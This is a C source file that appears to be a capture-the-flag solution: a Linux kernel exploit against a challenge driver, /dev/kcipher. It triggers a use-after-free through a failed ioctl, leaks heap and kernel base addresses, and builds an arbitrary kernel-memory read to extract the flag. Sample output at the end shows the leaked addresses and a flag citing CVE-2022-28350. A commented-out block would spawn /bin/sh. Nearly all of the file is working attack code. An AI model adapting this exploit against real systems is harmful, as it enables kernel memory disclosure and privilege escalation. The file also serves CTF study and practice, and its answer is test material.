#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <string.h>
#include <unistd.h>
#include <stddef.h>

#define err(msg) do { perror(msg); exit(-1); } while (0);

#define IOCTL_NEW_BUF 0xEDBEEF00
#define ALG_ROT 0
#define ALG_XOR 1
#define ALG_A1Z26 2
#define ALG_ATBASH 3

/*#define BUFF_SIZE 96*/
#define BUFF_SIZE sizeof(struct priv_buf)
#define XOR_KEY 0xcc

int fd, inode;

struct req_new_buf {
    uint32_t cipher_idx;
    uint8_t key;
};

struct priv_buf {
  uint32_t cipher_idx;
  char key;
  char gap5[3];
  uint64_t buffer_size;
  char *buffer;
  uint32_t spinlock;
  char cipher_alg[64];
  char padding[4];
};


void hex_view(char *buf, size_t size) {
    for (int i = 0; i < size; i++) {
        if ((i % 0x10) == 0) {
            printf("%08x:", i);
        }
        printf(" %02hhx", buf[i]);
        if ((i % 0x10) == 0xf) {
            printf("\n");
        }
    }
    printf("\n");
}

void xor(char k, void *buf, size_t len) {
    char *cbuf = (char *)buf;
    for (int i = 0; i < len; i++) {
        cbuf[i] ^= k;
    }
}

void arb_read(void *addr, char *leak, size_t len) {
    struct priv_buf pb = {0};

    memset(&pb, 0, BUFF_SIZE);
    memset(&pb, 0xff, offsetof(struct priv_buf, buffer));
    pb.buffer = addr;


    for (int i = 0; i < 8; i++) {
        if (((char *)(&pb.buffer))[i] == XOR_KEY) {
        puts("[-] ERR: invalid bytes in arb read address");
        exit(-1);
        }
    }

    xor(XOR_KEY, &pb, sizeof(pb)); // xor with XOR_KEY to allow null bytes in address
    write(4, &pb, sizeof(pb));
    read(4, 0, 0); // dexor the buffer

    read(5, leak, len);
}

void arb_write(void *addr, void *buf, size_t len) {
    
}


int main() {
    char buffer[BUFF_SIZE];
    /*struct priv_buf buffer;*/
    char *leak;
    unsigned long long heap;
    unsigned long long kbase;

    fd = open("/dev/kcipher", O_RDWR);
    if (-1 == fd) {
        err("open");
    }

    inode = ioctl(fd,
            IOCTL_NEW_BUF,
            &(struct req_new_buf) { .cipher_idx = ALG_XOR, .key = XOR_KEY });

    /* will return an error because of incorrect cipher_idx
     * but the anon_inode is not destructed and his priv_buf has been freed
     * so there is a uaf
     */
    ioctl(fd,
            IOCTL_NEW_BUF,
            &(struct req_new_buf) { .cipher_idx = 1337, .key = 0 });
    inode = 5; // maybe automate the retrieval of the anon_inode fd

    inode = ioctl(fd,
            IOCTL_NEW_BUF,
            &(struct req_new_buf) { .cipher_idx = ALG_XOR, .key = 0 });
    memset(buffer, 0, BUFF_SIZE);
    write(6, buffer, 0x20); // populate priv_buf.buffer
    close(6);
    
    memset(buffer, 0, BUFF_SIZE);
    memset(buffer, 0xff, offsetof(struct priv_buf, buffer)-1);
    write(4, buffer, BUFF_SIZE);

    leak = calloc(1, 0x200);
    read(5, leak, 0x200);
    /*hex_view(leak, 0x200);*/

    heap = *(unsigned long long *)(leak + 0x10);
    printf("[+] heap @ 0x%llx\n", heap);

    arb_read((void *)0xfffffe0000000004, (char *)&kbase, sizeof(kbase));
    kbase -= 0x408e00;
    printf("[+] kbase @ 0x%llx\n", kbase);

    char flag[64] = {0};
    arb_read(kbase + 0x9aa000, flag, sizeof(flag));
    puts(flag);

    /*void *addr = 0;*/
    /*while (addr != (void *)0x1337) {*/
        /*puts("read where :");*/
        /*scanf("%p", &addr);*/
        /*memset(leak, 0, 0x200);*/
        /*arb_read(addr, leak, 0x200);*/
        /*hex_view(leak, 0x200);*/


        /*puts("debugging shell...");*/
        /*system("/bin/sh");*/
    /*};*/

    puts("END");

    return 0;
}

/*

~ $ /tmp/exploit
[+] heap @ 0xffff9ec7c1172460
[+] kbase @ 0xffffffff8fe00000
corctf{b4s3d_0n_CVE-2022-28350}
END

*/
